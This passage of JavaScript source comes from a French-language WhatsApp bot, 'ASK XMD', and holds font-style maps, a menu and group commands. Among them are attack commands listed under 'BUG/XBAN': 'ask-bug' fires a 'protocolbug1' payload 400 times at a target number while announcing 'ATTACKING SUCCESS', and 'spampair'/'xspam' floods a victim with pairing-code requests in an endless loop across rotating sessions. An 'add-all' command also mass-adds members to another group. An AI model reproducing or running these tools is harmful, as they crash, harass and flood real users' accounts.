    26:{"a":"𝔞","b":"𝔟","c":"𝔠","d":"𝔡","e":"𝔢","f":"𝔣","g":"𝔤","h":"𝔥","i":"𝔦","j":"𝔧","k":"𝔨","l":"𝔩","m":"𝔪","n":"𝔫","o":"𝔬","p":"𝔭","q":"𝔮","r":"𝔯","s":"𝔰","t":"𝔱","u":"𝔲","v":"𝔳","w":"𝔴","x":"𝔵","y":"𝔶","z":"𝔷","A":"𝔄","B":"𝔅","C":"ℭ","D":"𝔇","E":"𝔈","F":"𝔉","G":"𝔊","H":"ℌ","I":"ℑ","J":"𝔍","K":"𝔎","L":"𝔏","M":"𝔐","N":"𝔑","O":"𝔒","P":"𝔓","Q":"𝔔","R":"ℜ","S":"𝔖","T":"𝔗","U":"𝔘","V":"𝔙","W":"𝔚","X":"𝔛","Y":"𝔜","Z":"ℨ" },
    27:{"`":"`","1":"１","2":"２","3":"３","4":"４","5":"５","6":"６","7":"７","8":"８","9":"９","0":"０","-":"－",":":"＝","~":"~","!":"！","@":"＠","#":"＃","$":"＄","%":"％","^":"^","&":"＆","*":"＊","(":"（",")":"）","_":"_","+":"＋","q":"ｑ","w":"ｗ","e":"ｅ","r":"ｒ","t":"ｔ","y":"ｙ","u":"ｕ","i":"ｉ","o":"ｏ","p":"ｐ","[":"[","]":"]","\\":"\\","Q":"Ｑ","W":"Ｗ","E":"Ｅ","R":"Ｒ","T":"Ｔ","Y":"Ｙ","U":"Ｕ","I":"Ｉ","O":"Ｏ","P":"Ｐ","{":"{","}":"}","|":"|","a":"ａ","s":"ｓ","d":"ｄ","f":"ｆ","g":"ｇ","h":"ｈ","j":"ｊ","k":"ｋ","l":"ｌ",";":"；","'":"＇","A":"Ａ","S":"Ｓ","D":"Ｄ","F":"Ｆ","G":"Ｇ","H":"Ｈ","J":"Ｊ","K":"Ｋ","L":"Ｌ",":":"：","\"":"\"","z":"ｚ","x":"ｘ","c":"ｃ","v":"ｖ","b":"ｂ","n":"ｎ","m":"ｍ",",":"，",".":"．","/":"／","Z":"Ｚ","X":"Ｘ","C":"Ｃ","V":"Ｖ","B":"Ｂ","N":"Ｎ","M":"Ｍ","<":"<",">":">","?":"？"},
    28:{"a":"ᴀ","b":"ʙ","c":"ᴄ","d":"ᴅ","e":"ᴇ","f":"ғ","g":"ɢ","h":"ʜ","i":"ɪ","j":"ᴊ","k":"ᴋ","l":"ʟ","m":"ᴍ","n":"ɴ","o":"ᴏ","p":"ᴘ","q":"ǫ","r":"ʀ","s":"s","t":"ᴛ","u":"ᴜ","v":"ᴠ","w":"ᴡ","x":"x","y":"ʏ","z":"ᴢ","A":"ᴀ","B":"ʙ","C":"ᴄ","D":"ᴅ","E":"ᴇ","F":"ғ","G":"ɢ","H":"ʜ","I":"ɪ","J":"ᴊ","K":"ᴋ","L":"ʟ","M":"ᴍ","N":"ɴ","O":"ᴏ","P":"ᴘ","Q":"ǫ","R":"ʀ","S":"s","T":"ᴛ","U":"ᴜ","V":"ᴠ","W":"ᴡ","X":"x","Y":"ʏ","Z":"ᴢ" },
    29:{"a":"𝒂","b":"𝒃","c":"𝒄","d":"𝒅","e":"𝒆","f":"𝒇","g":"𝒈","h":"𝒉","i":"𝒊","j":"𝒋","k":"𝒌","l":"𝒍","m":"𝒎","n":"𝒏","o":"𝒐","p":"𝒑","q":"𝒒","r":"𝒓","s":"𝒔","t":"𝒕","u":"𝒖","v":"𝒗","w":"𝒘","x":"𝒙","y":"𝒚","z":"𝒛","A":"𝐴","B":"𝐵","C":"𝐶","D":"𝐷","E":"𝐸","F":"𝐹","G":"𝐺","H":"𝐻","I":"𝐼","J":"𝐽","K":"𝐾","L":"𝐿","M":"𝑀","N":"𝑁","O":"𝑂","P":"𝑃","Q":"𝑄","R":"𝑅","S":"𝑆","T":"𝑇","U":"𝑈","V":"𝑉","W":"𝑊","X":"𝑋","Y":"𝑌","Z":"𝑍" },
    30:{"a":"𝛥","b":"𝐵","c":"𝐶","d":"𝐷","e":"𝛯","f":"𝐹","g":"𝐺","h":"𝛨","i":"𝛪","j":"𝐽","k":"𝛫","l":"𝐿","m":"𝛭","n":"𝛮","o":"𝛩","p":"𝛲","q":"𝑄","r":"𝑅","s":"𝑆","t":"𝑇","u":"𝑈","v":"𝛻","w":"𝑊","x":"𝛸","y":"𝑌","z":"𝛧","A":"𝛥","B":"𝐵","C":"𝐶","D":"𝐷","E":"𝛯","F":"𝐹","G":"𝐺","H":"𝛨","I":"𝛪","J":"𝐽","K":"𝛫","L":"𝐿","M":"𝛭","N":"𝛮","O":"𝛩","P":"𝛲","Q":"𝑄","R":"𝑅","S":"𝑆","T":"𝑇","U":"𝑈","V":"𝛻","W":"𝑊","X":"𝛸","Y":"𝑌","Z":"𝛧"},
    31:{"A":"𝚫","B":"𝚩","C":"𝐂","D":"𝐃","E":"𝚵","F":"𝐅","G":"𝐆","H":"𝚮","I":"𝚰","J":"𝐉","K":"𝐊","L":"𝐋","M":"𝚳","N":"𝚴","O":"𝚯","P":"𝚸","Q":"𝐐","R":"𝚪","S":"𝐒","T":"𝚻","U":"𝐔","V":"𝛁","W":"𝐖","X":"𝚾","Y":"𝐘","Z":"𝚭","a":"𝚫","b":"𝚩","c":"𝐂","d":"𝐃","e":"𝚵","f":"𝐅","g":"𝐆","h":"𝚮","i":"𝚰","j":"𝐉","k":"𝐊","l":"𝐋","m":"𝚳","n":"𝚴","o":"𝚯","p":"𝚸","q":"𝐐","r":"𝚪","s":"𝐒","t":"𝚻","u":"𝐔","v":"𝛁","w":"𝐖","x":"𝚾","y":"𝐘","z":"𝚭"},	
    32:{"A":"ꪖ","B":"᥇","C":"ᥴ","D":"ᦔ","E":"ꫀ","F":"ᠻ","G":"ᧁ","H":"ꫝ","I":"ﺃ","J":"꠹","K":"ᛕ","L":"ꪶ","M":"ꪑ","N":"ꪀ","O":"ꪮ","P":"ᜣ","Q":"ꪇ","R":"᥅","S":"ᦓ","T":"ꪻ","U":"ꪊ","V":"ꪜ","W":"᭙","X":"᥊","Y":"ꪗ","Z":"ɀ","a":"ꪖ","b":"᥇","c":"ᥴ","d":"ᦔ","e":"ꫀ","f":"ᠻ","g":"ᧁ","h":"ꫝ","i":"ﺃ","j":"꠹","k":"ᛕ","l":"ꪶ","m":"ꪑ","n":"ꪀ","o":"ꪮ","p":"ᜣ","q":"ꪇ","r":"᥅","s":"ᦓ","t":"ꪻ","u":"ꪊ","v":"ꪜ","w":"᭙","x":"᥊","y":"ꪗ","z":"ɀ"},
    33:{"ഒ":"ඉ","എ":"ᬤ","ഉ":"ຂ","ക":"ᤌ‌","ഗ":"ꪭ","ത":"ꫧ","ന":"ღ͢","മ്പ":"൩","വ":"൨","യ":"ᨨ͓","ര":"ᰍ","ി":"᭄","ീ":"ꪻ","ാ":"ꫂ","(":"ꪶ","ു":"⫰","‌്":"᷃","്":"ັ","ർ":"൪","ണ":"𑇥̅","ട":"ຮ","ട്ട":"ჴ","െ":"൭͛","ം":"◕","ഞ":"ൡ̅","േ":"ල","ൽ":"ᰢ","ന്ന":"ꢳ"},
      // Méthodes d'application
  apply: function(map, text) {
    let result = "";
    for (let character of text.split("")) {
      if (map[character] !== undefined) result += map[character];
      else if (map[character.toLowerCase()] !== undefined) result += map[character.toLowerCase()];
      else result += character;
    }
    return result;
  },

  list: function(text, fancy) {
    let msg = '\n*Fancy Styles:*\n\n';
    for (let i = 0; i < 34; i++) {
      if (fancy[i]) {
        msg += `${i}. ${fancy.apply(fancy[i], text)}\n`;
      }
    }
    return msg;
  }
};

switch (command) {

case 'ask-bug': {
if (!isCreator && !isPremium) return m.reply(mess.owner);
if (!text) return m.reply("241xxx or tag @user")

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = text.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return m.reply('use command + 241xxxx')
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
m.reply(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© - Invisible
𖥂 Protocolbug1 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug1(ask, target, false);
}
}
break;

case 'xspam':
case 'spamcode':
case 'spampair': {
    if (!isCreator && !isPremium) return m.reply(mess.owner);
    if (!text) return m.reply("241xxx|200");

    const [rawNumber, maxPerSession = "200"] = text.split("|");
    const target = rawNumber.replace(/[^0-9]/g, '').trim();
    const maxPerLoop = parseInt(maxPerSession);
    const delayBetweenRequests = 1500;
    const delayBetweenSession = 5000;
    const spamLimitPerSession = 50;

    await m.reply(`</> 𝙎𝙩𝙖𝙧𝙩 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️\n➤ Number: ${target}\n➤ Total: ∞ until manually stopped`);

    const {
        default: makeWaSocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion
    } = require('@whiskeysockets/baileys');
    const pino = require('pino');

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    let totalSent = 0;
    let sessionIndex = 1;

    while (true) {
        const sessionName = `SpamCodeSession-${sessionIndex}`;
        const { state } = await useMultiFileAuthState(sessionName);
        const { version } = await fetchLatestBaileysVersion();

        const ask = makeWaSocket({
            auth: state,
            version,
            logger: pino({ level: 'fatal' })
        });

        console.log(`\n[+] Start Session: ${sessionName}`);

        for (let i = 0; i < spamLimitPerSession; i++) {
            try {
                await sleep(delayBetweenRequests);
                const code = await ask.requestPairingCode(target);
                totalSent++;
                console.log(`[#${totalSent}] ✅ Sent to: ${target} - Code: ${code}`);
            } catch (err) {
                console.log(`[#${totalSent}] ❌ Error: ${err.message}`);
                break;
            }
        }

        await ask.ws.close();
        console.log(`[×] End Session: ${sessionName} — Rotating...\n`);

        sessionIndex++;
        await sleep(delayBetweenSession);
    }
}
break;

case "goodbye": {
 if (!m.isGroup) return ask.sendMessage(m.chat, {
 text: "❌ *Commande réservée aux groupes uniquement.*"
 }, { quoted: m });

 const groupMetadata = await ask.groupMetadata(m.chat);
 const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
 const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

 if (!isAdmin) return ask.sendMessage(m.chat, {
 text: "🚫 *Seuls les administrateurs peuvent utiliser cette commande.*"
 }, { quoted: m });

 global.db = global.db || {};
 global.db.goodbye = global.db.goodbye || {};

 const arg = text?.toLowerCase();
 if (!["on", "off"].includes(arg)) {
 return ask.sendMessage(m.chat, {
 text: `📌 *Utilisation :* ${prefix}goodbye on/off`
 }, { quoted: m });
 }

 const enable = arg === "on";
 global.db.goodbye[m.chat] = enable;

 await ask.sendMessage(m.chat, {
 text: `👋 *Message d'au revoir ${enable ? "activé ✅" : "désactivé ❌"}*`
 }, { quoted: m });

 // Événement intégré pour envoi automatique
 ask.ev.on('group-participants.update', async (update) => {
 try {
 const isGoodbyeEnabled = global.db?.goodbye?.[update.id];
 if (!isGoodbyeEnabled) return;

 const metadata = await ask.groupMetadata(update.id);

 for (const participant of update.participants) {
 if (update.action === 'remove') {
 const ppUser = await ask.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
 const username = participant.split('@')[0];
 const groupName = metadata.subject;

 const goodbyeText = `😢 *@${username} a quitté le groupe ${groupName}...*\n\nOn espère te revoir bientôt !`;

 await ask.sendMessage(update.id, {
 image: { url: ppUser },
 caption: goodbyeText,
 mentions: [participant]
 });
 }
 }
 } catch (err) {
 console.log("Erreur goodbye :", err);
 }
 });
}
break;


case "welcome": {
 if (!m.isGroup) return ask.sendMessage(m.chat, {
 text: "❌ *Commande réservée aux groupes uniquement.*"
 }, { quoted: m });

 const groupMetadata = await ask.groupMetadata(m.chat);
 const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
 const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

 if (!isAdmin) return ask.sendMessage(m.chat, {
 text: "🚫 *Seuls les administrateurs peuvent utiliser cette commande.*"
 }, { quoted: m });

 global.db = global.db || {};
 global.db.welcome = global.db.welcome || {};

 const arg = text?.toLowerCase();
 if (!["on", "off"].includes(arg)) {
 return ask.sendMessage(m.chat, {
 text: `📌 *Utilisation :* ${prefix}welcome on/off`
 }, { quoted: m });
 }

 const enable = arg === "on";
 global.db.welcome[m.chat] = enable;

 await ask.sendMessage(m.chat, {
 text: `👋 *Message de bienvenue ${enable ? "activé ✅" : "désactivé ❌"}*`
 }, { quoted: m });

 // Événement intégré pour envoi automatique
 ask.ev.on('group-participants.update', async (update) => {
 try {
 const isWelcomeEnabled = global.db?.welcome?.[update.id];
 if (!isWelcomeEnabled) return;

 const metadata = await ask.groupMetadata(update.id);

 for (const participant of update.participants) {
 if (update.action === 'add') {
 const ppUser = await ask.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
 const username = participant.split('@')[0];
 const groupName = metadata.subject;

 const welcomeText = `🎉 *Bienvenue à @${username} dans le groupe ${groupName} !*\n\n💬 Présente-toi ou fais connaissance avec les membres!`;

 await ask.sendMessage(update.id, {
 image: { url: ppUser },
 caption: welcomeText,
 mentions: [participant]
 });
 }
 }
 } catch (err) {
 console.log("Erreur welcome :", err);
 }
 });
} 
break;

case 'm':
case 'menu': {
 await ask.sendMessage(m.chat, { react: { text: "📁", key: m.key } }) 
 
 let menu = `╭━━━❖ 𝙰𝚂𝙺 𝚇𝙼𝙳 𝟷.𝟸.𝟶 ❖━━━╮
┃𝙲𝚛𝚎𝚊𝚝𝚎 𝚋𝚢 𝙳𝚎𝚟 𝙰𝚜𝚔
┃╔═▢ 
┃║𝚞𝚜𝚎𝚛 : *${m.pushName}*
┃║𝚙𝚛𝚎𝚏𝚒𝚡 : *[${global.prefix}]*
┃║𝚑𝚎𝚞𝚛𝚎 : *${time}*
┃║𝚍𝚊𝚝𝚎 : *${date}*
┃║𝚓𝚘𝚞𝚛 : *${day}*
┃║𝚖𝚘𝚍𝚎 : *${ask.public ? "𝙿𝚞𝚋𝚕𝚒𝚌" : "𝙿𝚛𝚒𝚟𝚊𝚝𝚎"}*
┃║𝚘𝚠𝚗𝚎𝚛 : *${pushname}*
┃╰════════════❀
╰⪼━━━━━━━━━━━━━⪻╯
╭━━━⊰𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙲𝙾𝙳𝙴
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝙳𝙴𝚅 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙷𝙴𝙻𝙿-𝙲𝙼𝙳
├ ◦ 𝙳𝙴𝚅-𝚂𝙲𝚁𝙸𝙿𝚃
├ ◦ 𝙱𝚄𝚈-𝚂𝙲𝚁𝙸𝙿𝚃 
╰━━━━━━━━━━━━━━━╯
╭━━━⊰𝚄𝙿𝚃𝙸𝙼𝙴 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙿𝙸𝙽𝙶
├ ◦ 𝚄𝙿𝚃𝙸𝙼𝙴
├ ◦ 𝙰𝙻𝙻𝚃𝙸𝙼𝙴
├ ◦ 𝙾𝙽𝙻𝙸
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝙾𝚆𝙽𝙴𝚁 𝙲𝙼𝙳 ⊱━━━╮
├ ◦ 𝙰𝙳𝙳𝙿𝚁𝙴𝙼
├ ◦ 𝙳𝙴𝙻𝙿𝚁𝙴𝙼
├ ◦ 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁
├ ◦ 𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁
├ ◦ 𝙾𝚆𝙽𝙴𝚁
├ ◦ 𝚂𝙴𝚃𝙰𝚄𝚃𝙷𝙾𝚁
├ ◦ 𝚂𝙴𝚃𝙿𝙰𝙲𝙺
├ ◦ 𝙰𝙳𝙳𝙲𝙷𝙹𝙸𝙳
├ ◦ 𝚂𝙴𝙽𝙳𝙼𝙲
├ ◦ 𝙻𝙴𝙵𝚃
├ ◦ 𝙰𝙳𝙳-𝙰𝙻𝙻
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝚂𝚃𝙸𝙲𝙺 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝚃𝙰𝙺𝙴
├ ◦ 𝚂𝚃𝙸𝙲𝙺𝙴𝚁
├ ◦ 𝙴𝙼𝙾𝙹𝙸𝙼𝙸𝚇
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝙿𝙻𝙰𝚈/𝚂𝙾𝙽𝙶 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙿𝙻𝙰𝚄
├ ◦ 𝚂𝙾𝙽𝙶
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝚄𝚃𝙸𝙻𝚂 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙶𝙸𝚅𝙴𝙻𝙸𝙽𝙺
├ ◦ 𝙰𝚄𝚃𝙾𝚁𝙴𝙰𝙲𝚃
├ ◦ 𝙰𝙿𝙺
├ ◦ 𝙹𝙸𝙳
├ ◦ 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝚂𝙴𝙰𝚁𝙲𝙷
├ ◦ 𝙵𝙰𝙽𝙲𝚈
├ ◦ 𝙸𝙼𝙶
├ ◦ 𝚆𝙸𝙺𝙸
├ ◦ 𝙶𝙾𝙾𝙶𝙻𝙴
├ ◦ 𝙼𝙴𝚃𝙴𝙾
├ ◦ 𝙰𝙸
├ ◦ 𝚄𝚁𝙻
├ ◦ 𝙰𝚂𝙺-𝙰𝙸
├ ◦ 𝙲𝙻𝙲
├ ◦ 𝚅𝙰𝚁
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝚆𝙰𝙸𝙵𝚄 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙷𝚆𝙰𝙸𝙵𝚄
├ ◦ 𝙷𝙽𝙴𝙺𝙾
├ ◦ 𝙱𝙻𝙾𝚆𝙹𝙾𝙱
├ ◦ 𝙲𝙾𝚄𝙿𝙻𝙴
├ ◦ 𝚂𝙷𝙸𝙽𝙾𝙱𝚄
├ ◦ 𝙼𝙴𝙶𝚄𝙼𝙸𝙽
├ ◦ 𝚃𝚁𝙰𝙿
╰━━━━━━━━━━━━━━━╯
╭━━━⊰ 𝙶𝚁𝙾𝚄𝙿𝙴 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙿𝚁𝙾𝙼𝙾𝚃𝙴
├ ◦ 𝙳𝙴𝙼𝙾𝚃𝙴
├ ◦ 𝙿𝚁𝙾𝙼𝙾𝚃𝙴𝙰𝙻𝙻
├ ◦ 𝙳𝙴𝙼𝙾𝚃𝙴𝙰𝙻𝙻
├ ◦ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴
├ ◦ 𝙶𝙾𝙾𝙳𝙱𝚈𝙴
├ ◦ 𝙰𝙽𝚃𝙸𝙿𝚁𝙾𝙼𝙾𝚃𝙴
├ ◦ 𝙰𝙽𝚃𝙸𝙳𝙴𝙼𝙾𝚃𝙴
├ ◦ 𝙰𝙽𝚃𝙸𝙿𝚄𝚁𝙶𝙴
├ ◦ 𝙺𝙸𝙲𝙺𝙰𝙻𝙻
├ ◦ 𝙺𝙸𝙲𝙺𝙰𝙻𝙻𝟸
├ ◦ 𝚃𝙰𝙶𝙰𝙻𝙻/𝚃𝙰𝙶
├ ◦ 𝙷𝙸𝙳𝙴𝚃𝙰𝙶
├ ◦ 𝙺𝙸𝙲𝙺
├ ◦ 𝙲𝚁𝙴𝙰𝚃𝙴𝙶𝚁𝙾𝚄𝙿
├ ◦ 𝙰𝙽𝚃𝙸𝙻𝙸𝙽𝙺
├ ◦ 𝙾𝙿𝙴𝙽
├ ◦ 𝙲𝙻𝙾𝚂𝙴
├ ◦ 𝙰𝙳𝙳
├ ◦ 𝙲𝙻𝙾𝚂𝙴𝚃𝙸𝙼𝙴
├ ◦ 𝙹𝙾𝙸𝙽
├ ◦ 𝙳𝙴𝙻𝙴𝚃𝙴/𝙳𝙴𝙻
├ ◦ 𝚂𝙴𝚃𝙽𝙰𝙼𝙴𝙶𝙲
├ ◦ 𝚂𝙴𝚃𝙿𝙿𝙶𝙲
├ ◦ 𝚂𝙴𝚃𝙳𝙴𝚂𝙲
├ ◦ 𝚂𝙴𝚃𝙻𝙸𝙽𝙺𝙶𝙲
├ ◦ 𝙻𝙸𝙽𝙺
╰━━━━━━━━━━━━━━━╯
╭━━━⊰𝙱𝚄𝙶/ XBAN 𝙲𝙼𝙳⊱━━━╮
├ ◦ 𝙰𝚂𝙺-𝙱𝚄𝙶. *<𝚗𝚞𝚖𝚋𝚎𝚛>*
├ ◦ 𝚂𝙿𝙰𝙼𝙿𝙰𝙸𝚁/𝚇𝚂𝙿𝙰𝙼 *<𝚗𝚞𝚖𝚋𝚎𝚛>*
╰━━━━━━━━━━━━━━━╯
`;

 await ask.sendMessage(m.chat, { 
 gifPlayback: false,
 image: { url: 'welcome.png' },
 caption: menu, 
 contextInfo: {
 mentionedJid: [m.sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: "➪ 𝖠𝖲𝖪 𝖷𝖬𝖣 𝖳𝖤𝖢𝖧⌘",
 newsletterJid: `120363330359618597@newsletter` 
 },
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true,
 title: `𝖠𝖲𝖪-𝖳𝖤𝖢𝖧 𝖡𝖮𝖳`,
 mediaType: 3,
 renderLargerThumbnail: false,
 thumbnailUrl: 'welcome.png',
 sourceUrl: `https://whatsapp.com/channel/0029VaiPkRPLY6d0qEX50e2k`
 }
 }
 }, { quoted: m });
}
break;

case 'ask-ai': {
 if (!text) return m.reply(`Example: ${prefix + command} qu'est-ce qu'un bot?`);
 const model_list = {
 chatgpt4: {
 api: 'https://stablediffusion.fr/gpt4/predict2',
 referer: 'https://stablediffusion.fr/chatgpt4'
 },
 chatgpt3: {
 api: 'https://stablediffusion.fr/gpt3/predict',
 referer: 'https://stablediffusion.fr/chatgpt3'
 }
 };

 try {
 let results = [];
 for (const [model, config] of Object.entries(model_list)) {
 try {
const axios = require('axios');
 const hmm = await axios.get(config.referer);
 const { data } = await axios.post(config.api, {
 prompt: text
 }, {
 headers: {
 accept: '*/*',
 'content-type': 'application/json',
 origin: 'https://stablediffusion.fr',
 referer: config.referer,
 cookie: hmm.headers['set-cookie'].join('; '),
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
 }
 });
 results.push(`*${model.toUpperCase()}*:\n${data.message || 'invalid query.'}`);
 } catch (err) {
 results.push(`*${model.toUpperCase()}*:\nVoici les résultats.`);
 console.error(`Error on ${model}:`, err.message);
 }
 }
 m.reply(results.join('\n\n'));
 } catch (e) {
 console.error(e);
 m.reply('an error has occurred.');
 }
}
break;

case 'antipurge': {
 if (!m.isGroup) return m.reply('⚠️ Uniquement pour les groupes');
 if (!isAdmin && !isCreator) return m.reply('🔒 Réservé aux admins');

 // Charger les paramètres
 const groupSettings = require('./system/database/groupSettings.json');
 const groupId = m.chat;

 // Initialisation si nouveau groupe
 if (!groupSettings[groupId]) {
 groupSettings[groupId] = { 
 antipurge: false,
 whitelist: []
 };
 }

 // Gestion ON/OFF/WHITELIST
 const action = args[0]?.toLowerCase();
 
 if (action === 'on' || action === 'off') {
 groupSettings[groupId].antipurge = (action === 'on');
 fs.writeFileSync('./system/database/groupSettings.json', JSON.stringify(groupSettings, null, 2));
 return m.reply(`🛡️ Antipurge ${action === 'on' ? 'activé' : 'désactivé'}`);
 }
 else if (action === 'whitelist' && args[1]) {
 const user = args[1].replace('@', '') + '@s.whatsapp.net';
 if (!groupSettings[groupId].whitelist.includes(user)) {
 groupSettings[groupId].whitelist.push(user);
 fs.writeFileSync('./system/database/groupSettings.json', JSON.stringify(groupSettings, null, 2));
 return m.reply(`✅ ${args[1]} ajouté à la whitelist`);
 }
 return m.reply('⚠️ Utilisateur déjà dans la whitelist');
 }
 else {
 const status = groupSettings[groupId]?.antipurge ? 'ON' : 'OFF';
 const whitelisted = groupSettings[groupId]?.whitelist?.join('\n') || 'Aucun';
 return m.reply(
 `⚙️ État Antipurge: ${status}\n` +
 `👤 Whitelist:\n${whitelisted}\n\n` +
 `Usage:\n` +
 `${prefix}antipurge on/off\n` +
 `${prefix}antipurge whitelist @user`
 );
 }
}
 break;
case 'add-all': {
 // Protection anti-spam renforcée
 const spamKey = `${m.sender}_add-all`;
 if (spamDB[spamKey] && Date.now() - spamDB[spamKey] < 60000) { // Cooldown de 60s maintenant
 const remaining = Math.ceil((60000 - (Date.now() - spamDB[spamKey])) / 1000);
 return m.reply(`⚠️ Veuillez patienter ${remaining} secondes avant de réutiliser cette commande.`);
 }
 spamDB[spamKey] = Date.now();

 try {
 // Vérifications initiales
 if (!m.isGroup) return m.reply("❌ *Uniquement utilisable en groupe*");
 
 const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
 if (!match) return m.reply("❗ *Lien d'invitation invalide*");

 await ask.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

 // 1. Limite de membres (nouveauté)
 const MAX_MEMBERS = 500;
 const inviteCode = match[1];
 let targetGroupId;

 // 2. Rejoindre le groupe cible
 try {
 targetGroupId = await ask.groupAcceptInvite(inviteCode);
 } catch (e) {
 targetGroupId = inviteCode + '@g.us';
 }

 // 3. Récupération et vérification des membres
 const sourceMeta = await ask.groupMetadata(m.chat);
 const botNumber = await ask.decodeJid(ask.user.id);
 
 let membersToAdd = sourceMeta.participants
 .filter(p => !p.id.includes(botNumber))
 .map(p => p.id);

 // Nouveau contrôle de taille
 if (membersToAdd.length > MAX_MEMBERS) {
 membersToAdd = membersToAdd.slice(0, MAX_MEMBERS);
 await ask.sendMessage(m.chat, {
 text: `⚠️ Limité à ${MAX_MEMBERS} membres pour cette opération`
 });
 }

 // 4. Vérification des droits admin
 const targetMeta = await ask.groupMetadata(targetGroupId);
 if (!targetMeta.participants.some(p => p.id === botNumber && p.admin)) {
 return m.reply("🚫 *Admin requis dans le groupe cible*");
 }

 // 5. Ajout sécurisé avec paramètres ajustés
 const BATCH_SIZE = 3;
 const DELAY = 4000; // Délai légèrement augmenté
 let addedCount = 0;

 for (let i = 0; i < membersToAdd.length; i += BATCH_SIZE) {
 const batch = membersToAdd.slice(i, i + BATCH_SIZE);
 
 try {
 await ask.groupParticipantsUpdate(targetGroupId, batch, 'add');
 addedCount += batch.length;
 await sleep(DELAY);
 
 // Rapport moins fréquent (tous les 10 lots)
 if ((i / BATCH_SIZE) % 10 === 0) {
 await ask.sendMessage(m.chat, {
 text: `📊 Progression : ${addedCount}/${membersToAdd.length}`
 });
 }
 } catch (err) {
 console.error("Erreur d'ajout:", err);
 // Ne pas bloquer pour des erreurs partielles
 }
 }

 // Rapport final sécurisé
 await ask.sendMessage(m.chat, {
 text: `✅ ${addedCount} membres ajoutés à ${targetMeta.subject}\n` +
 `_Exécuté par @${m.sender.split('@')[0]}_`,
 mentions: [m.sender]
 });

 } catch (e) {
 console.error("Erreur globale:", e);
 await ask.sendMessage(m.chat, {
 text: "❌ Opération interrompue",
 react: { text: "❌", key: m.key }
 });
 }
}
break;

case 'c':
case 'code':
case 'connect': {
 await ask.sendMessage(m.chat, { react: { text: "🎀", key: m.key } });

 if (!text) return m.reply(`Example:\n ${prefix + command} 241xxxxxx`);

 let victim = text.split("|")[0];
 let Xreturn = m.mentionedJid?.[0] || m.quoted?.sender || victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

 const contactInfo = await ask.onWhatsApp(Xreturn);
 if (!contactInfo || contactInfo.length === 0) {
 return m.reply("The number is not registered on WhatsApp");
 }

 await m.reply("*processing.....*");

 const numberOnly = victim.replace(/[^0-9]/g, '');
 const countryCode = numberOnly.slice(0, 3);
 const prefixxx = numberOnly.slice(0, 1);
 const firstTwoDigits = numberOnly.slice(0, 2);

 const isValidWhatsAppNumber = (number) => {
 return number.length >= 10 && number.length <= 15 && !isNaN(number);
 };

 if (countryCode === "252" || prefixxx === "0" || firstTwoDigits === "89" || countryCode.startsWith("85")) {
 return m.reply("Sorry, numbers with country code 252, prefix 0, starting with 89, or +85 are not supported for using the bot.");
 }

 if (!isValidWhatsAppNumber(numberOnly)) {
 return m.reply("Invalid WhatsApp number. Please enter a valid number.");
 }

 const startpairing = require('./ask-pair-fire.js');
 await startpairing(Xreturn);
 await sleep(4000);

 const fs = require('fs');
 const cu = fs.readFileSync('./system/database/pairing.json', 'utf-8');
 const cuObj = JSON.parse(cu);
 await sleep(2000);

 await ask.sendMessage(Xreturn, {
 text: `🎉 *Connexion Réussie !*\n\n🔒 Un code unique va suivre, copie-le et active ta session.\n\n⚡ Profite bien de *ASK XMD* !`
 }, { quoted: m });

 await sleep(4500);

 await ask.sendMessage(Xreturn, {
 text: `🔑 *Ton code de connexion :* ${cuObj.code}\n\n➡️ Envoie ce code au bot pour commencer.`
 }, { quoted: m });
} 
break;

case "tagall":
case "tag": {
 await ask.sendMessage(m.chat, { react: { text: "📣", key: m.key } });

 if (!isCreator && !isAdmin) return m.reply(mess.admin);
 if (!isGroup) return m.reply(mess.group);

 let teks = "*꧁⌘ 𝔸𝕊𝕂-𝕏𝕄𝔻 ⌘꧂*\n" +
